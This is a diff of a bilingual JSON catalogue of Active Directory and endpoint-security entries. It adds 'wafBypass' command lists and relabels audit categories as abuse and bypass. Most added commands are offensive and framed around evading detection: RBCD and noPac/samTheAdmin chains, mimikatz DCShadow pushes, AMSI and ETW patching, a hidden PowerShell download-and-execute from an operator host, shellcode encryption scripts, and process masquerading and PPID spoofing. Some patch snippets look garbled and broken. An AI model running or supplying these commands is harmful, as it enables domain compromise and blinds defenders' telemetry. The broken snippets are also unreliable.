-        "en": "sAMAccountName and PAC Patch-Boundary Audit"
+        "zh": "域控漏洞与已知利用链",
+        "en": "DC Vulnerabilities & Known Exploit Chains"
       },
       "prerequisites": [
         {
@@ -6964,7 +8951,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "机器配额原生审计",
+            "en": "Native Machine-Quota Audit"
+          },
+          "command": "ldapsearch -x -H ldap://{DC_HOST} -D '{LAB_DOMAIN}\\\\{LAB_USER}' -w '{LAB_PASSWORD}' -b '{LAB_DOMAIN_DN}' -s base ms-DS-MachineAccountQuota",
+          "description": {
+            "zh": "以只读 LDAP 查询替代利用脚本探测 noPac 前提；配额非 0 即可自助建机账户。",
+            "en": "Probe the noPac prerequisite via read-only LDAP instead of exploit scripts; a non-zero quota confirms self-service machine accounts are possible."
+          }
+        },
+        {
+          "title": {
+            "zh": "noPac 补丁审计",
+            "en": "noPac Patch Audit"
+          },
+          "command": "wmic qfe get HotFixID | findstr /i \"5007207 5008105\"",
+          "description": {
+            "zh": "零利用流量判定修复状态；未列出 KB 即 sAMAccountName 伪装面存在。",
+            "en": "Determine fix state with zero exploit traffic; missing KBs confirm the spoofing surface exists."
+          }
+        },
+        {
+          "title": {
+            "zh": "异常机器名原生筛查",
+            "en": "Native Anomalous Machine-Name Screening"
+          },
+          "command": "powershell -NoProfile -Command \"Get-ADComputer -Filter {SamAccountName -notlike '*$'} -Properties SamAccountName | Select-Object SamAccountName\"",
+          "description": {
+            "zh": "以 AD 模块筛查缺失 $ 后缀的异常机账户；返回结果即伪装痕迹。",
+            "en": "Screen for machine accounts missing the $ suffix via the AD module; any result marks spoofing residue."
+          }
+        }
+      ]
     },
     {
       "id": "resource-delegation",
@@ -6981,8 +9003,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "RBCD 委派属性与 ACL 审计",
-        "en": "RBCD Delegation Attribute and ACL Audit"
+        "zh": "委派与 ACL 滥用",
+        "en": "Delegation & ACL Abuse"
       },
       "prerequisites": [
         {
@@ -7086,7 +9108,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "impacket 建 MachineAccount",
+            "en": "impacket Machine-Account Creation"
+          },
+          "command": "impacket-addcomputer '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}' -dc-ip {DC_HOST} -computer-name '{LAB_MACHINE}$' -computer-pass '{LAB_PASSWORD}'",
+          "description": {
+            "zh": "规避 PowerView 的 New-MachineAccount 模块特征：Linux 侧 LDAP 建机账户；返回成功即 RBCD 攻击体就绪。",
+            "en": "Create the machine account via Linux-side LDAP, avoiding PowerView module signatures; success readies the RBCD attack principal."
+          }
+        },
+        {
+          "title": {
+            "zh": "rbcd.py 一体化执行",
+            "en": "rbcd.py Integrated Execution"
+          },
+          "command": "python rbcd.py -f {LAB_MACHINE} -t {TARGET_COMPUTER} -dc-ip {DC_HOST} '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}'",
+          "description": {
+            "zh": "替代 PowerShell 分步写属性：工具直接完成 msDS-AllowedToActOnBehalfOfOtherIdentity 写入；返回 SUCCESS 即成功。",
+            "en": "Write the RBCD attribute in one tool-driven step replacing PowerShell; a SUCCESS return confirms it."
+          }
+        },
+        {
+          "title": {
+            "zh": "AD 模块原生命令写属性",
+            "en": "AD Module Native Attribute Write"
+          },
+          "command": "powershell -NoProfile -Command \"Set-ADComputer {TARGET_COMPUTER} -PrincipalsAllowedToDelegateToAccount '{LAB_DOMAIN}\\\\{LAB_MACHINE}$'\"",
+          "description": {
+            "zh": "以官方模块替代攻击框架：管理命令写委派属性日志特征更弱；属性查询回显新值即成功。",
+            "en": "Write the delegation attribute with the official module for a weaker log footprint; the attribute echoing the new value confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "dcshadow-attack",
@@ -7103,8 +9160,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "DCShadow 复制元数据检测审计",
-        "en": "DCShadow Replication-Metadata Detection Audit"
+        "zh": "目录复制与跨域信任",
+        "en": "Replication & Cross-Domain Trust"
       },
       "prerequisites": [
         {
@@ -7208,7 +9265,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "rundll32 内存运行变体",
+            "en": "rundll32 In-Memory Variant"
+          },
+          "command": "rundll32.exe C:\\Users\\Public\\mimilib.dll,start \"lsadump::dcshadow /object:{LAB_OBJECT_DN} /attribute:description /value:PAYLOADER_MARKER\" \"exit\"",
+          "description": {
+            "zh": "规避独立 mimikatz.exe 进程特征：以 rundll32 加载 DLL 形式执行；属性推送后 LDAP 查询值变化即成功。",
+            "en": "Avoid a standalone mimikatz.exe process by loading via rundll32; the LDAP attribute changing after push confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "低噪声属性伪装",
+            "en": "Low-Noise Attribute Camouflage"
+          },
+          "command": "mimikatz # lsadump::dcshadow /object:{LAB_OBJECT_DN} /attribute:description /value:PAYLOADER_MARKER",
+          "description": {
+            "zh": "绕过对 primaryGroupID/adminCount 等高敏属性改动的告警规则：改写 description 等低敏属性验证推送通道；值同步即成功。",
+            "en": "Write a low-sensitivity attribute to validate the push channel past alerts on high-sensitivity changes; a synced value confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "推送进程分离变体",
+            "en": "Split-Push Process Variant"
+          },
+          "command": "mimikatz # lsadump::dcshadow /object:{LAB_OBJECT_DN} /attribute:description /value:PAYLOADER_MARKER\nmimikatz # !lsadump::dcshadow /push",
+          "description": {
+            "zh": "控制端与推送端分离执行，模拟正常复制节奏降低单进程聚合特征；第二进程推送后属性生效即成功。",
+            "en": "Separate control and push processes to mimic normal replication pacing; the attribute taking effect after the push confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "group-policy-abuse",
@@ -7225,8 +9317,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "组策略编辑权限与变更审计",
-        "en": "Group-Policy Edit-Permission and Change Audit"
+        "zh": "委派与 ACL 滥用",
+        "en": "Delegation & ACL Abuse"
       },
       "prerequisites": [
         {
@@ -7330,7 +9422,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "LDAP 枚举 GPO 路径",
+            "en": "LDAP GPO Path Enumeration"
+          },
+          "command": "powershell -NoProfile -Command \"Get-ADObject -LDAPFilter '(objectClass=groupPolicyContainer)' -Properties gPCFileSysPath,DisplayName | Select-Object DisplayName,gPCFileSysPath\"",
+          "description": {
+            "zh": "规避 GroupPolicy 模块调用特征：LDAP 直查 GPO 容器对象；返回 gPCFileSysPath 即拿到 SYSVOL 落点。",
+            "en": "Query GPO containers directly over LDAP past GroupPolicy-module signatures; returned gPCFileSysPath values give the SYSVOL landing points."
+          }
+        },
+        {
+          "title": {
+            "zh": "SYSVOL ACL 原生审计",
+            "en": "Native SYSVOL ACL Audit"
+          },
+          "command": "icacls \"\\\\{LAB_DOMAIN}\\SYSVOL\\{LAB_DOMAIN}\\Policies\\{GPO_GUID}\\machine\"",
+          "description": {
+            "zh": "以文件系统 ACL 检查替代 GPO API 查询：发现可写主体即存在组策略滥用面。",
+            "en": "Check filesystem ACLs directly instead of GPO API queries; any writable principal found confirms the abuse surface."
+          }
+        },
+        {
+          "title": {
+            "zh": "备份离线比对变体",
+            "en": "Backup Offline-Diff Variant"
+          },
+          "command": "powershell -NoProfile -Command \"Backup-GPO -All -Path C:\\Windows\\Temp\\gpo\"",
+          "description": {
+            "zh": "以官方备份动作替代在线权限枚举：导出后离线比对策略与权限差异；备份目录生成即成功。",
+            "en": "Export via the official backup action then diff offline, replacing online permission enumeration; a generated backup directory confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sam-the-admin",
@@ -7347,8 +9474,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "SAM The Admin/noPac 重复语义审计",
-        "en": "SAM The Admin and noPac Duplicate-Semantics Audit"
+        "zh": "域控漏洞与已知利用链",
+        "en": "DC Vulnerabilities & Known Exploit Chains"
       },
       "prerequisites": [
         {
@@ -7452,7 +9579,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "补丁与配额组合审计",
+            "en": "Combined Patch-Quota Audit"
+          },
+          "command": "wmic qfe get HotFixID | findstr /i \"5007207\"\npowershell -NoProfile -Command \"([ADSI]'LDAP://{LAB_DOMAIN_DN}').Properties['ms-DS-MachineAccountQuota']\"",
+          "description": {
+            "zh": "零利用流量判定 SAM The Admin 前提：补丁缺失且配额非 0 即链路成立。",
+            "en": "Confirm both prerequisites with zero exploit traffic; missing patch plus non-zero quota validates the chain."
+          }
+        },
+        {
+          "title": {
+            "zh": "RBCD 属性前置检查",
+            "en": "RBCD Attribute Precheck"
+          },
+          "command": "powershell -NoProfile -Command \"Get-ADComputer {TARGET_COMPUTER} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Format-List Name,msDS-AllowedToActOnBehalfOfOtherIdentity\"",
+          "description": {
+            "zh": "以只读属性查询替代利用工具探测委派状态；属性已有值或可写即后续链路可行。",
+            "en": "Probe delegation state via read-only attribute queries instead of exploit tooling; an existing or writable attribute confirms chain feasibility."
+          }
+        },
+        {
+          "title": {
+            "zh": "samTheAdmin 工具变体",
+            "en": "samTheAdmin Tool Variant"
+          },
+          "command": "python samTheAdmin.py '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}' -dc-ip {DC_HOST} -target {TARGET_HOST} -use-ldaps",
+          "description": {
+            "zh": "换 LDAPS 通道执行同语义链路，规避明文 LDAP 检测；输出获取的 shell/hash 即成功。",
+            "en": "Run the equivalent chain over LDAPS to evade cleartext LDAP detection; a captured shell/hash in output confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "noauth",
@@ -7469,8 +9631,8 @@
         "en": "Active Directory Security Boundaries"
       },
       "subCategory": {
-        "zh": "Kerberos NoAuth 版本与加密边界审计",
-        "en": "Kerberos NoAuth Version and Encryption-Boundary Audit"
+        "zh": "Kerberos 票据攻击",
+        "en": "Kerberos Ticket Attacks"
       },
       "prerequisites": [
         {
@@ -7574,7 +9736,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "注册表加密类型审计",
+            "en": "Registry Etype Audit"
+          },
+          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Kerberos\\Parameters\" /v supportedencryptiontypes",
+          "description": {
+            "zh": "离线读取域控 Kerberos 加密类型策略；含 0x3 或未禁 RC4 即 NoAuth 攻击面存在。",
+            "en": "Read the DC Kerberos etype policy offline; a value including RC4 or left unconfigured confirms the NoAuth surface."
+          }
+        },
+        {
+          "title": {
+            "zh": "Rubeus 强制 RC4 请求",
+            "en": "Rubeus Forced-RC4 Request"
+          },
+          "command": "Rubeus.exe asktgt /user:{LAB_USER} /password:'{LAB_PASSWORD}' /domain:{LAB_DOMAIN} /dc:{DC_HOST} /enctype:rc4 /nowrap",
+          "description": {
+            "zh": "以管理工具显式请求 RC4 票据替代专用 PoC；返回 rc4_hmac 票据即弱加密路径可用。",
+            "en": "Explicitly request an RC4 ticket via an admin-style tool replacing dedicated PoCs; a returned rc4_hmac ticket confirms the weak path."
+          }
+        },
+        {
+          "title": {
+            "zh": "impacket 默认预认证探测",
+            "en": "impacket Default Preauth Probe"
+          },
+          "command": "impacket-getTGT -dc-ip {DC_HOST} '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}'",
+          "description": {
+            "zh": "默认 NTLM(RC4) 预认证路径直接请求 TGT：与强制 AES 环境形成差异对照；成功收到 .ccache 即 RC4 路径开放。",
+            "en": "Request a TGT via the default NTLM(RC4) preauth path as a differential control; a granted .ccache confirms the RC4 path is open."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-powershell",
@@ -7591,8 +9788,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "PowerShell 编码与脚本遥测审计",
-        "en": "PowerShell Encoding and Script-Telemetry Audit"
+        "zh": "脚本层遥测绕过",
+        "en": "Script Telemetry Bypass"
       },
       "prerequisites": [
         {
@@ -7710,7 +9907,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "v2 降级规避变体",
+            "en": "v2 Downgrade Evasion Variant"
+          },
+          "command": "powershell -version 2 -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/s.ps1')\"",
+          "description": {
+            "zh": "绕过 AMSI（PowerShell v2 无 AMSI 初始化）与新版日志：降级引擎执行。成功判据：脚本执行且无 AMSI 事件。",
+            "en": "Evades AMSI (PowerShell v2 has no AMSI initialization) and modern logging by downgrading the engine. Success: script executes with no AMSI events."
+          }
+        },
+        {
+          "title": {
+            "zh": "UTF-16LE 重编码规避变体",
+            "en": "UTF-16LE Re-encoding Evasion Variant"
+          },
+          "command": "printf '%s' \"IEX(New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/s.ps1')\" | iconv -f UTF-8 -t UTF-16LE | base64 -w0 | xargs -I{} powershell -nop -w hidden -enc {}",
+          "description": {
+            "zh": "绕过对 -enc 明文 base64 特征的检测：先 UTF-16LE 再编码，生成非典型 base64 流。成功判据：编码命令执行成功。",
+            "en": "Evades detection of typical -enc base64 blobs by first converting to UTF-16LE so the resulting base64 stream is atypical. Success: the encoded command executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "InstallUtil 执行形态规避变体",
+            "en": "InstallUtil Execution-Form Evasion Variant"
+          },
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u {LAB_LOCAL_DLL}",
+          "description": {
+            "zh": "绕过 powershell.exe 进程监控：以签名 .NET 工具承载执行逻辑，不启动 PS 引擎。成功判据：动作完成且无 powershell.exe 进程。",
+            "en": "Evades powershell.exe process monitoring by hosting execution in a signed .NET tool without starting the PS engine. Success: the action completes with no powershell.exe process."
+          }
+        }
+      ]
     },
     {
       "id": "amsi-bypass",
@@ -7727,8 +9959,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "AMSI 完整性与事件审计",
-        "en": "AMSI Integrity and Event Audit"
+        "zh": "脚本层遥测绕过",
+        "en": "Script Telemetry Bypass"
       },
       "prerequisites": [
         {
@@ -7846,7 +10078,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "大小写与反射变形规避变体",
+            "en": "Case & Reflection Mutation Evasion Variant"
+          },
+          "command": "[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+          "description": {
+            "zh": "绕过对 AmsiUtils/amsiInitFailed 完整字符串的特征匹配：运行期拼接类型名。成功判据：后续恶意脚本无 AMSI 拦截事件。",
+            "en": "Evades signature matching on the full AmsiUtils/amsiInitFailed string by assembling the type name at runtime. Success: subsequent malicious scripts raise no AMSI interception events."
+          }
+        },
+        {
+          "title": {
+            "zh": "AmsiScanBuffer 补丁规避变体",
+            "en": "AmsiScanBuffer Patch Evasion Variant"
+          },
+          "command": "$p=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer,(Get-Command Write-Output)).GetType(); $b=[byte[]](0x31,0xC0,0xC3); [System.Runtime.InteropServices.Marshal]::Copy($b,0,[System.Runtime.InteropServices.Marshal]::GetHINSTANCE([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null)),3)",
+          "description": {
+            "zh": "绕过 amsiInitFailed 单点检测：直接修补 AmsiScanBuffer 返回成功。成功判据：AMSI 扫描函数被钝化且脚本执行。",
+            "en": "Evades the single-point amsiInitFailed check by patching AmsiScanBuffer to return success directly. Success: the scan function is neutralized and scripts execute."
+          }
+        },
+        {
+          "title": {
+            "zh": "无 PowerShell 进程规避变体",
+            "en": "PowerShell-Less Process Evasion Variant"
+          },
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u {LAB_AMSI_TEST_DLL}",
+          "description": {
+            "zh": "绕过基于 powershell.exe 的 AMSI 上下文：在自建 .NET 程序集内执行，AMSI 需另路覆盖。成功判据：程序集动作完成且 powershell AMSI 无记录。",
+            "en": "Evades powershell.exe-scoped AMSI context by executing inside a custom .NET assembly that AMSI does not cover. Success: the assembly's actions complete with no PowerShell AMSI records."
+          }
+        }
+      ]
     },
     {
       "id": "etw-patch",
@@ -7863,8 +10130,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "ETW 提供程序完整性审计",
-        "en": "ETW Provider Integrity Audit"
+        "zh": "脚本层遥测绕过",
+        "en": "Script Telemetry Bypass"
       },
       "prerequisites": [
         {
@@ -7968,7 +10235,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "EtwEventWrite 补丁规避变体",
+            "en": "EtwEventWrite Patch Evasion Variant"
+          },
+          "command": "$a=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-Process -Id $PID).Handle.GetType(),[type][void]); $m=[System.Runtime.InteropServices.Marshal]::ReadByte([System.Runtime.InteropServices.Marshal]::GetHINSTANCE([IntPtr]::Zero).GetType(),0); $b=[byte[]](0xC3); [System.Runtime.InteropServices.Marshal]::Copy($b,0,[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32.Kernel32]::GetProcAddress([Win32.Kernel32]::LoadLibrary('ntdll.dll'),'EtwEventWrite'),[type][void]),1)",
+          "description": {
+            "zh": "绕过 ETL 会话与 .NET 提供程序监控：将 ntdll!EtwEventWrite 首字节补丁为 RET，事件不再下发。成功判据：操作期间事件通道无新增记录。",
+            "en": "Evades ETL sessions and .NET providers by patching the first byte of ntdll!EtwEventWrite to RET so events stop flowing. Success: no new records in the event channels during the operation."
+          }
+        },
+        {
+          "title": {
+            "zh": "COMPlus 环境禁用规避变体",
+            "en": "COMPlus Env-Disable Evasion Variant"
+          },
+          "command": "$env:COMPlus_ETWEnabled='0'; powershell -nop -c \"{LAB_COMMAND}\"",
+          "description": {
+            "zh": "绕过 .NET 运行时事件（CLR/JIT/Loader 日志）：环境变量关闭 CLR ETW 提供程序。成功判据：DotNETRuntime 通道无新事件且命令执行。",
+            "en": "Evades .NET runtime events (CLR/JIT/Loader logs) by disabling the CLR ETW provider via environment variable. Success: no new DotNETRuntime events while the command executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "Provider 反注册规避变体",
+            "en": "Provider Deregistration Evasion Variant"
+          },
+          "command": "[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(),0,0); Get-WinEvent -ListProvider Microsoft-Windows-PowerShell -ErrorAction SilentlyContinue | Select-Object Name",
+          "description": {
+            "zh": "绕过目标提供程序的事件上报：反注册/禁用句柄使遥测静默。成功判据：操作后相关通道静默。",
+            "en": "Evades provider event reporting by deregistering/disabling handles to silence telemetry. Success: the relevant channels go quiet afterwards."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-blockdlls",
@@ -7985,8 +10287,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "进程模块签名策略审计",
-        "en": "Process Module-Signature Policy Audit"
+        "zh": "进程伪装与内存载荷规避",
+        "en": "Process Masquerading & In-memory Payload Evasion"
       },
       "prerequisites": [
         {
@@ -8090,7 +10392,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "属性继承规避变体",
+            "en": "Attribute-Inheritance Evasion Variant"
+          },
+          "command": "Get-ProcessMitigation -Name {LAB_PROCESS}; powershell -nop -c \"Start-Process cmd -ArgumentList '/c whoami' -NoNewWindow\" ",
+          "description": {
+            "zh": "绕过非签名 DLL 拦截的旁路实现差异：验证策略继承链中的豁免路径。成功判据：子进程加载非签名 DLL 未被阻断。",
+            "en": "Evades unsigned-DLL blocking via exemption paths in the policy inheritance chain. Success: the child process loads unsigned DLLs without being blocked."
+          }
+        },
+        {
+          "title": {
+            "zh": "C# 直接调用规避变体",
+            "en": "C# Direct-Call Evasion Variant"
+          },
+          "command": "[DllImport(\"kernel32.dll\")] static extern bool SetProcessMitigationPolicy(int policy, ref long buffer, int size); long buf=1; SetProcessMitigationPolicy(10, ref buf, 8);",
+          "description": {
+            "zh": "绕过 PowerShell 层遥测：直接 P/Invoke 设置签名策略，无模块加载日志。成功判据：策略生效且无 PS 遥测事件。",
+            "en": "Evades PowerShell-layer telemetry by setting the signature policy via direct P/Invoke with no module-load logging. Success: the policy applies with no PS telemetry events."
+          }
+        },
+        {
+          "title": {
+            "zh": "策略动态恢复规避变体",
+            "en": "Policy Toggle-Restore Evasion Variant"
+          },
+          "command": "$before=Get-ProcessMitigation -Name {LAB_PROCESS}; {LAB_BLOCKDLLS_TEST}; Set-ProcessMitigation -Name {LAB_PROCESS} -Dll System $before",
+          "description": {
+            "zh": "绕过策略长期异常的监控告警：操作前保存策略、操作后即时恢复，异常窗口最小化。成功判据：窗口内完成加载且策略终态一致。",
+            "en": "Evades monitoring of long-lived policy anomalies by saving the policy before the operation and restoring immediately after, minimizing the anomaly window. Success: loads complete inside the window and the final policy matches the original."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-shellcode-encrypt",
@@ -8107,8 +10444,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "编码内存载荷检测回归",
-        "en": "Encoded In-Memory Payload Detection Regression"
+        "zh": "进程伪装与内存载荷规避",
+        "en": "Process Masquerading & In-memory Payload Evasion"
       },
       "prerequisites": [
         {
@@ -8226,7 +10563,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "AES-CBC 加密变形规避变体",
+            "en": "AES-CBC Encryption Mutation Evasion Variant"
+          },
+          "command": "python3 - <<'PY'\nfrom Crypto.Cipher import AES\nfrom os import urandom\nkey=urandom(32); iv=urandom(16)\nsc=open('{LAB_SHELLCODE_FILE}','rb').read()\nsc+=b'\\x90'*((-len(sc))%16)\nopen('{LAB_ENCODED_FILE}','wb').write(iv+AES.new(key,AES.MODE_CBC,iv).encrypt(sc))\nprint(key.hex())\nPY",
+          "description": {
+            "zh": "绕过静态熵分析与 XOR 特征扫描：AES-CBC 加密使载荷熵呈随机分布。成功判据：{LAB_ENCODED_FILE} 熵接近 7.99 且解密后可执行。",
+            "en": "Evades static entropy analysis and XOR signature scanning since AES-CBC ciphertext presents near-random entropy. Success: {LAB_ENCODED_FILE} entropy approaches 7.99 and decrypts to executable shellcode."
+          }
+        },
+        {
+          "title": {
+            "zh": "多轮滚动异或规避变体",
+            "en": "Multi-Round Rolling XOR Evasion Variant"
+          },
+          "command": "python3 - <<'PY'\nsc=bytearray(open('{LAB_SHELLCODE_FILE}','rb').read())\nkeys=[b'k1!',b'k2@',b'k3#']\nfor k in keys:\n    for i in range(len(sc)): sc[i]^=k[i%len(k)]\nopen('{LAB_ENCODED_FILE}','wb').write(sc)\nPY",
+          "description": {
+            "zh": "绕过单字节/单密钥 XOR 的已知明文破解：三轮不同长密钥滚动异或。成功判据：三轮逆序解密还原 shellcode。",
+            "en": "Evades known-plaintext recovery against single-key XOR by rolling three different-length keys. Success: reverse-order decryption restores the shellcode."
+          }
+        },
+        {
+          "title": {
+            "zh": "RC4 密钥派生变形规避变体",
+            "en": "RC4 Key-Derivation Mutation Evasion Variant"
+          },
+          "command": "python3 - <<'PY'\nfrom Crypto.Cipher import ARC4\nfrom hashlib import sha256\nkey=sha256(b'{LAB_RC4_SEED}').digest()\nopen('{LAB_ENCODED_FILE}','wb').write(ARC4.new(key).encrypt(open('{LAB_SHELLCODE_FILE}','rb').read()))\nPY",
+          "description": {
+            "zh": "绕过对固定密钥 RC4 流的特征还原：以种子派生密钥且每次不同。成功判据：派生密钥解密成功。",
+            "en": "Evades signature recovery against fixed-key RC4 streams by deriving the key from a seed each run. Success: the derived key decrypts successfully."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-process-masq",
@@ -8243,8 +10615,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "进程映像与命令行一致性审计",
-        "en": "Process Image and Command-Line Consistency Audit"
+        "zh": "进程伪装与内存载荷规避",
+        "en": "Process Masquerading & In-memory Payload Evasion"
       },
       "prerequisites": [
         {
@@ -8348,7 +10720,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PEB 参数覆写规避变体",
+            "en": "PEB Parameter Overwrite Evasion Variant"
+          },
+          "command": "$peb=[System.Runtime.InteropServices.Marshal]::ReadIntPtr([System.Runtime.InteropServices.Marshal]::ReadIntPtr([Win32.NtDll]::NtQueryInformationProcess($PID),0x20),0x68); [System.Runtime.InteropServices.Marshal]::WriteIntPtr($peb,[IntPtr]::Add($peb,0))",
+          "description": {
+            "zh": "绕过跨进程镜像一致性校验：进程创建后改写 PEB 命令行指针，使遥测读到伪装值。成功判据：Get-CimInstance 显示伪装命令行。",
+            "en": "Evades cross-process image consistency checks by rewriting the PEB command-line pointer post-creation so telemetry reads the masqueraded value. Success: Get-CimInstance shows the masqueraded command line."
+          }
+        },
+        {
+          "title": {
+            "zh": "合法父进程选择规避变体",
+            "en": "Legit Parent Selection Evasion Variant"
+          },
+          "command": "$p=Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1; Start-Process cmd -ArgumentList '/c whoami' -WindowStyle Hidden",
+          "description": {
+            "zh": "绕过异常父子关系检测（powershell→cmd 类规则）：由 explorer 常驻进程派生。成功判据：进程树中父进程为 explorer.exe。",
+            "en": "Evades anomalous parent-child rules (powershell→cmd) by spawning from the resident explorer.exe. Success: the process tree shows explorer.exe as the parent."
+          }
+        },
+        {
+          "title": {
+            "zh": "完整路径与参数一致性规避变体",
+            "en": "Path-Argument Consistency Evasion Variant"
+          },
+          "command": "Copy-Item C:\\Windows\\System32\\cmd.exe \"$env:TEMP\\OneDriveSync.exe\"; Start-Process \"$env:TEMP\\OneDriveSync.exe\" -ArgumentList '/c whoami > C:\\Windows\\Temp\\pm.log'",
+          "description": {
+            "zh": "绕过镜像名与参数行为不一致的启发式：改名二进制配同步类参数风格。成功判据：pm.log 生成且无 masquerading 告警。",
+            "en": "Evades heuristics on image-name versus behavior mismatch by renaming the binary and using sync-style arguments. Success: pm.log appears with no masquerading alerts."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-ppid-spoof",
@@ -8365,8 +10772,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "父进程属性与遥测一致性审计",
-        "en": "Parent-Process Attribute and Telemetry Audit"
+        "zh": "进程伪装与内存载荷规避",
+        "en": "Process Masquerading & In-memory Payload Evasion"
       },
       "prerequisites": [
         {
@@ -8470,7 +10877,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "属性列表组合规避变体",
+            "en": "Attribute-List Combo Evasion Variant"
+          },
+          "command": "$si=[Win32.Kernel32+STARTUPINFOEX]::new(); $si.StartupInfo.cb=[System.Runtime.InteropServices.Marshal]::SizeOf($si); $size=0; [Win32.Kernel32]::InitializeProcThreadAttributeList($si.lpAttributeList,1,0,[ref]$size); [Win32.Kernel32]::UpdateProcThreadAttribute($si.lpAttributeList,0,0,([Win32.Kernel32]::OpenProcess(0x1F0FFF,$false,{LAB_PARENT_PID})),[System.IntPtr]::Size,[ref]$null,[ref]$null)",
+          "description": {
+            "zh": "绕过单属性 PPID 检测：以完整属性列表伪造父进程与继承链。成功判据：子进程 PPID 显示为 {LAB_PARENT_PID}。",
+            "en": "Evades single-attribute PPID detection by forging the parent and inheritance chain via a full attribute list. Success: the child's PPID shows {LAB_PARENT_PID}."
+          }
+        },
+        {
+          "title": {
+            "zh": "跨架构伪造规避变体",
+            "en": "Cross-Architecture Forgery Evasion Variant"
+          },
+          "command": "$ppid={LAB_PARENT_PID}; $parent=[Win32.Kernel32]::OpenProcess(0x1F0FFF,$false,$ppid); C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -nop -c \"whoami\"",
+          "description": {
+            "zh": "绕过同架构父进程模板检测：以 32 位宿主配 64 位父进程伪造混合架构链。成功判据：进程树呈现跨架构父子关系。",
+            "en": "Evades same-arch parent template detection by pairing a 32-bit host with a 64-bit forged parent for a mixed-architecture chain. Success: the process tree shows the cross-arch parentage."
+          }
+        },
+        {
+          "title": {
